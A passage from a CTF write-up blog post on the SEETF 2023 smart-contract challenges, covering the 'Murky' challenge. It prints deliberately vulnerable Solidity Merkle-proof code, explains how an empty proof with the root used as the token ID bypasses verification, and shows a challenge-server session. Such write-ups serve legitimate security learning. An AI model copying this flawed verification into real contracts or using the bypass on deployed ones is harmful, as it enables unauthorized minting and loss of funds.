<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>SEETF 2023 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:title" content="SEETF 2023" />
<meta property="og:description" content="Writeup for Smart Contract challenges in SEETF 2023 by Chovid99" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chovid99.github.io/posts/seetf-2023/" /><meta property="og:image" content="https://chovid99.github.io/C99-web-card.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-06-12T09:00:01+07:00" />
<meta property="article:modified_time" content="2023-06-12T10:57:58+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png"/>

<meta name="twitter:title" content="SEETF 2023"/>
<meta name="twitter:description" content="Writeup for Smart Contract challenges in SEETF 2023 by Chovid99"/>
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/seetf-2023/" /><link rel="prev" href="https://chovid99.github.io/posts/wanictf-2023/" /><link rel="next" href="https://chovid99.github.io/posts/corctf-2023/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "SEETF 2023",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/chovid99.github.io\/posts\/seetf-2023\/"
        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, SEETF, smart-contract, reentrancy, diamond, facet, 2023","wordcount":  10012 ,
        "url": "https:\/\/chovid99.github.io\/posts\/seetf-2023\/","datePublished": "2023-06-12T09:00:01+07:00","dateModified": "2023-06-12T10:57:58+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Chovid99"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">SEETF 2023</h1><div class="post-meta">
            <div class="post-meta-line">
                </div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Jun 12, 2023">Jun 12, 2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;10012 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;48 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#smart-contracts">Smart Contracts</a>
      <ul>
        <li><a href="#murky">Murky</a>
          <ul>
            <li><a href="#initial-analysis">Initial Analysis</a></li>
            <li><a href="#solution">Solution</a></li>
            <li><a href="#full-script">Full Script</a></li>
          </ul>
        </li>
        <li><a href="#fiasco">Fiasco</a>
          <ul>
            <li><a href="#initial-analysis-1">Initial Analysis</a></li>
            <li><a href="#solution-1">Solution</a></li>
            <li><a href="#full-script-1">Full Script</a></li>
          </ul>
        </li>
        <li><a href="#pigeon-bank">Pigeon Bank</a>
          <ul>
            <li><a href="#initial-analysis-2">Initial Analysis</a></li>
            <li><a href="#solution-2">Solution</a></li>
            <li><a href="#full-script-2">Full Script</a></li>
          </ul>
        </li>
        <li><a href="#pigeon-vault">Pigeon Vault</a>
          <ul>
            <li><a href="#initial-analysis-3">Initial Analysis</a></li>
            <li><a href="#solution-3">Solution</a></li>
            <li><a href="#full-script-3">Full Script</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><figure><a class="lightgallery" href="https://i.imgur.com/nSOR0p3.png" title="https://i.imgur.com/nSOR0p3.png" data-thumbnail="https://i.imgur.com/nSOR0p3.png" data-sub-html="<h2>SEETF 2023</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/nSOR0p3.png"
            data-srcset="https://i.imgur.com/nSOR0p3.png, https://i.imgur.com/nSOR0p3.png 1.5x, https://i.imgur.com/nSOR0p3.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/nSOR0p3.png" />
    </a><figcaption class="image-caption">SEETF 2023</figcaption>
    </figure>
<p>Lately, I&rsquo;ve been diving into learning smart contracts, and I stumbled upon the SEETF 2023 challenges this weekend. It turns out there are four cool challenges specifically focused on smart contracts. Despite having a hectic weekend, I decided to carve out some time to give them a shot. Fortunately, I managed to solve all of it. Here is my writeup for the challenges.</p>
<h1 id="smart-contracts">Smart Contracts</h1>
<h2 id="murky">Murky</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>The SEE team has a list of special NFTs that are only allowed to be minted. Find out which one its allowed!</p>
<p><code>nc win.the.seetf.sg 8546</code></p>
</div>
        </div>
    </div>
<h3 id="initial-analysis">Initial Analysis</h3>
<p>In this challenge, we were given three solidity files. Let&rsquo;s check it first.</p>
<p><strong>MerkleProof.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: Unlicense
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">library</span> <span class="n">MerkleProof</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Verify a Merkle proof proving the existence of a leaf in a Merkle tree. Assumes that each pair of leaves and each pair of pre-images in the proof are sorted.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">verify</span><span class="p">(</span><span class="kt">bytes32</span><span class="p">[]</span> <span class="n">calldata</span> <span class="n">proof</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">root</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">index</span><span class="p">)</span> <span class="k">internal</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">bytes32</span> <span class="n">computedHash</span> <span class="o">=</span> <span class="kt">bytes32</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">index</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">root</span> <span class="o">!=</span> <span class="kt">bytes32</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="s">&#34;MerkleProof: Root hash cannot be zero&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">computedHash</span> <span class="o">!=</span> <span class="kt">bytes32</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="s">&#34;MerkleProof: Leaf hash cannot be zero&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">proof</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">bytes32</span> <span class="n">proofElement</span> <span class="o">=</span> <span class="n">proof</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">computedHash</span> <span class="o">&lt;</span> <span class="n">proofElement</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// Hash(current computed hash + current element of the proof)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">computedHash</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">computedHash</span><span class="p">,</span> <span class="n">proofElement</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// Hash(current element of the proof + current computed hash)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">computedHash</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">proofElement</span><span class="p">,</span> <span class="n">computedHash</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Check if the computed hash (root) is equal to the provided root
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="n">computedHash</span> <span class="o">==</span> <span class="n">root</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This file contains a library called <code>MerkleProof</code>, which can be called to verify whether the given <code>index</code> is the leaf of the merkle tree based on the given <code>proof</code>.</p>
<p><strong>SEEPass.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">17</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;./MerkleProof.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/token/ERC721/ERC721.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">SEEPass</span> <span class="k">is</span> <span class="n">ERC721</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">bytes32</span> <span class="k">private</span> <span class="n">_merkleRoot</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">uint256</span> <span class="o">=&gt;</span> <span class="kt">bool</span><span class="p">)</span> <span class="k">private</span> <span class="n">_minted</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_root</span><span class="p">)</span> <span class="n">ERC721</span><span class="p">(</span><span class="s">&#34;SEE Pass&#34;</span><span class="p">,</span> <span class="s">&#34;SEEP&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">_merkleRoot</span> <span class="o">=</span> <span class="n">_root</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">mintSeePass</span><span class="p">(</span><span class="kt">bytes32</span><span class="p">[]</span> <span class="n">calldata</span> <span class="n">_proof</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_tokenId</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">hasMinted</span><span class="p">(</span><span class="n">_tokenId</span><span class="p">),</span> <span class="s">&#34;Already minted&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">verify</span><span class="p">(</span><span class="n">_proof</span><span class="p">,</span> <span class="n">_merkleRoot</span><span class="p">,</span> <span class="n">_tokenId</span><span class="p">),</span> <span class="s">&#34;Invalid proof&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">_minted</span><span class="p">[</span><span class="n">_tokenId</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">_safeMint</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">_tokenId</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">verify</span><span class="p">(</span><span class="kt">bytes32</span><span class="p">[]</span> <span class="n">calldata</span> <span class="n">proof</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">root</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">index</span><span class="p">)</span> <span class="k">public</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">MerkleProof</span><span class="p">.</span><span class="n">verify</span><span class="p">(</span><span class="n">proof</span><span class="p">,</span> <span class="n">root</span><span class="p">,</span> <span class="n">index</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">hasMinted</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_tokenId</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">_minted</span><span class="p">[</span><span class="n">_tokenId</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This contract is trying to implement their own NFT based on the <code>ERC721</code> structure. There is a function called <code>mintSeePass</code> that can be used to mint a new NFT. However, before we can mint a new NFT, we need to be able to provide unused <code>tokenId</code> and the correct <code>proof</code> so that we can pass the <code>MerkleProof</code> verification.</p>
<p><strong>Setup.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">17</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;./SEEPass.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Setup</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">SEEPass</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">pass</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_merkleRoot</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">pass</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SEEPass</span><span class="p">(</span><span class="n">_merkleRoot</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">isSolved</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">pass</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This is the setup contract. As you can see, to solve this challenge, the goal is to make the <code>msg.sender</code> (which is us) has at least one NFT.</p>
<h3 id="solution">Solution</h3>
<p>Based on the above initial analysis, we know that the goal is we need to be able to call <code>mintSeePass</code>. However, we need to pass the <code>MerkleProof</code> verification first.</p>
<p>After looking at the <code>SEEPass</code> contract and <code>MerkleProof</code> library, I noticed some interesting thing. Let&rsquo;s re-visit the <code>verify</code> code.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">    <span class="c1">// Verify a Merkle proof proving the existence of a leaf in a Merkle tree. Assumes that each pair of leaves and each pair of pre-images in the proof are sorted.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">verify</span><span class="p">(</span><span class="kt">bytes32</span><span class="p">[]</span> <span class="n">calldata</span> <span class="n">proof</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">root</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">index</span><span class="p">)</span> <span class="k">internal</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">bytes32</span> <span class="n">computedHash</span> <span class="o">=</span> <span class="kt">bytes32</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">index</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">root</span> <span class="o">!=</span> <span class="kt">bytes32</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="s">&#34;MerkleProof: Root hash cannot be zero&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">computedHash</span> <span class="o">!=</span> <span class="kt">bytes32</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="s">&#34;MerkleProof: Leaf hash cannot be zero&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">proof</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">bytes32</span> <span class="n">proofElement</span> <span class="o">=</span> <span class="n">proof</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">computedHash</span> <span class="o">&lt;</span> <span class="n">proofElement</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// Hash(current computed hash + current element of the proof)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">computedHash</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">computedHash</span><span class="p">,</span> <span class="n">proofElement</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// Hash(current element of the proof + current computed hash)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">computedHash</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">proofElement</span><span class="p">,</span> <span class="n">computedHash</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Check if the computed hash (root) is equal to the provided root
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="n">computedHash</span> <span class="o">==</span> <span class="n">root</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>If we set an empty <code>proof</code> and set the <code>index</code> as the <code>uint256</code> representation of the given <code>root</code>, then we won&rsquo;t reach the loop. Because of that, the code will compare <code>computedHash == root</code>, which is <code>true</code> in this case because the <code>computedHash</code> is obviously the same as the <code>root</code>.</p>
<p>Checking through the <code>SEEPass</code> and <code>Setup</code> contract, we can safely use the <code>uint256</code> of <code>root</code> as <code>tokenId</code> because it isn&rsquo;t used yet.</p>
<p>Now that we know how to solve this challenge, let&rsquo;s try to interact with the given host and port to check how to interact with the challenge.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc win.the.seetf.sg 8546
</span></span><span class="line"><span class="cl">1 - launch new instance
</span></span><span class="line"><span class="cl">2 - kill instance
</span></span><span class="line"><span class="cl">3 - acquire flag
</span></span><span class="line"><span class="cl">action? 1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">your private blockchain has been deployed!
</span></span><span class="line"><span class="cl">it will automatically terminate in 1 hour
</span></span><span class="line"><span class="cl">here&#39;s some useful information
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">uuid:           172a3bb7-439a-46c0-ad7a-6bb6b80a39ba
</span></span><span class="line"><span class="cl">rpc endpoint:   http://win.the.seetf.sg:8545/172a3bb7-439a-46c0-ad7a-6bb6b80a39ba
</span></span><span class="line"><span class="cl">private key:    0x0e64f92c4e9fbf6fdfd08e0d80c425cf8e6982ab952efe5f6f52785887f3b552
</span></span><span class="line"><span class="cl">public key:    0x4644cc78f277A624D4f6EAeDa5E203939147E334
</span></span><span class="line"><span class="cl">setup contract: 0x8596731EaD6F44cD8bb5E3A448D7defCD12E9047
</span></span></code></pre></td></tr></table>
</div>
